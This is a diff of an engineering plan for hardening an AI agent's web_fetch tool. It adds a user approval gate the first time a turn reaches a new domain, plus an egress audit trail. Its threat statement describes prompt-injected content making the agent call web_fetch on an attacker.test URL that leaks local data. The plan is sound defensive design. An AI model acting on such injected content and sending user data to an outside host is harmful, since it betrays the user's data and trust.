@@ -74,9 +74,27 @@
 - [ ] **6. Adversarial verify (subagent):** try to reach a private IP through `web_fetch`/`web_search` (redirect-chain rebind, IPv6, the SearXNG base, multi-answer DNS) — ground-truth spy on the real backend. Nothing private may connect; local SearXNG base must still work.
 - [ ] **7. Commit:** `fix(egress): route web_fetch + web_search through the pinned transport (close SSRF/TOCTOU, unify the outbound chokepoint)`
 
-### Item 2b — First-contact domain approval + egress audit  *(detailed before we start it)*
+### Item 2b — First-contact domain approval + egress audit  *(detailed 2026-07-18 — awaiting go)*
 
-Reuse `permissions.registry` at the agent loop (`agent.py:1552`, where `turn_id`/`perm_mode` are in scope — the web tools are in `SAFE_TOOLS` and run in `asyncio.to_thread`, so the gate lifts to the loop, not the sync egress fns). First outbound to a new **registrable domain** per session (key on `project_id` — there is no backend `conversation_id`) emits `approval_required` (opaque id = the domain) and `await registry.wait(...)`. Approved domains ride a module-level registry (mirroring `permissions.registry`) or a per-turn `egress_state` dict threaded like `artifact_store` (`agent.py:1271`). Log every decision via `observability.audit({"event":"egress_decision", ...})` — `EgressBlocked` is currently unaudited. Tests copy the `test_agent_hitl.py` registry-poll harness.
+**Threat.** Injected content drives the agent to `web_fetch("http://attacker.test/?leak=<local data>")`. SSRF pinning (2a) stops it reaching *internal* hosts, but not exfil to a *public* attacker domain. The Claude-Desktop-shaped control: the first time a turn reaches a **new domain**, ask the user (human-in-the-loop), reusing the approval UI we already have.
+
+**Scope decisions (made — flag to change):**
+- **Gate `web_fetch` only.** It's the one tool whose destination is an *arbitrary, agent-controlled* URL. `web_search` (fixed DDG / trusted SearXNG), MCP, and connectors all go to *fixed/user-configured* hosts — their domain is implicitly trusted by being configured, so gating them is pure noise. (If we later want connector-domain prompts, it's a one-line extension.)
+- **Approval key = hostname** (`urlsplit(url).hostname.lower()`), not eTLD+1 — no public-suffix dependency; slightly tighter (each subdomain approved once). Note as a future refinement.
+- **Per-project memory** (user's choice): a module-level `EgressApprovalRegistry` (mirroring `permissions.registry`), `approved: dict[project_key -> set[host]]`, in-memory (not persisted across restart yet — `ApprovalRecord` persistence is a later add). `project_key = active_project` (or its id); turns with no project key on `turn_id` (per-turn fallback).
+- **Respect `perm_mode`.** Gate only when `gate_on` (`bool(turn_id) and perm_mode != "auto"`). In `auto` mode, auto-approve **but still audit**. Reuses the exact existing gate condition.
+- **Reuse the approval flow verbatim.** Emit `approval_required` with `id = tc.id` (the real tool-call id), `name = "web_fetch"`, `input = args`, plus a `reason` naming the host; `await permissions.registry.wait(turn_id, tc.id, ...)`; the desktop's `ApprovalPrompt.tsx` + `POST /agent/turn/{turn_id}/permission` resolve it unchanged. On approve → record host for the project; on deny → skip the tool with a `web_fetch_tool_error: domain_not_approved (<host>)` result.
+
+**Files:** new `backend/ocd_core/egress_policy.py` (registry + `outbound_host(tool_name, args) -> str | None`); `backend/ocd_core/agent.py` (the gate, next to the existing permission gate ~`:1552`); `backend/ocd_core/observability.py` (reuse `audit`, no change); optionally `integrations.py` (audit a `web_fetch` SSRF block). Tests: `backend/tests/test_egress_approval.py` (copy the `test_agent_hitl.py` registry-poll harness).
+
+- [ ] **1. `egress_policy.py`** — `EgressApprovalRegistry` (`is_approved(key, host)`, `approve(key, host)`, `reset()` for tests) + module singleton `registry`; `outbound_host(tool_name, args)` returns the lowercased hostname for `web_fetch`, else `None`. Unit-test both.
+- [ ] **2. Failing agent-loop test** — drive `run_turn(..., turn_id, permission_mode="ask")` with a fake `web_fetch`; assert it emits `approval_required` for a new host and suspends; a resolver approves via `permissions.registry.resolve`; assert the tool then runs, the host is recorded, and a **second** `web_fetch` to the same host in a later turn does NOT re-prompt (per-project memory). Separately assert deny → `domain_not_approved` and the tool never runs.
+- [ ] **3. Implement the gate** in the loop: `host = egress_policy.outbound_host(name, args); if gate_on and host and not egress_policy.registry.is_approved(key, host): <emit approval_required, describe, await wait, audit, approve-or-skip>`. In `auto` mode or when already approved, skip the prompt but `audit({"event":"egress_decision", "decision": "auto"/"cached", ...})`.
+- [ ] **4. Audit** every decision (`approved`/`denied`/`auto`/`cached`) via `observability.audit`; add one `audit({"event":"egress_blocked", ...})` where `web_fetch` turns `EgressBlocked` into `url_not_allowed` (so SSRF blocks land in the trail too — currently unlogged).
+- [ ] **5. Green + regression:** `test_agent_hitl.py`, `test_permissions.py`, `test_agent_permission_route.py` stay green (the new gate must not disturb the existing sensitive-tool gate).
+- [ ] **6. Commit:** `feat(egress): first-contact domain approval for web_fetch + egress audit trail`
+
+*(No adversarial-verify stage for 2b — it's a HITL/UX control, not a new attack-surface boundary; spec + quality review suffice.)*
 
 ### Item 2c — Deterministic outbound redaction  *(detailed before we start it)*
 
